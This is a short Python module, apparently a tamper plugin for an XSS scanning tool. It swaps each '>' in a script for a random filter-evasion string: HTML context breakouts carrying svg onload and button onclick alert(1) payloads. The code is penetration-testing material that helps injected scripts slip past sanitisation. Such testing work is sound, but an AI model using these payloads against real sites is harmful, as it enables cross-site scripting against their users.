import random


__PRIORITY__ = 5


def tamper(script):
    start_tag = ">"
    fillers = (
        "javascript:/*--></script>", "</title></style><svg/onload='alert(1);'/>",
        "</style><svg/onload='alert(1);'/>",
        "</textarea></title><button onclick='alert(1);'/>xanxss</textarea>"
    )
    retval = []
    for c in script:
        if c == start_tag:
                c = "{}".format(random.choice(fillers))
        retval.append(c)
    return ''.join(retval)
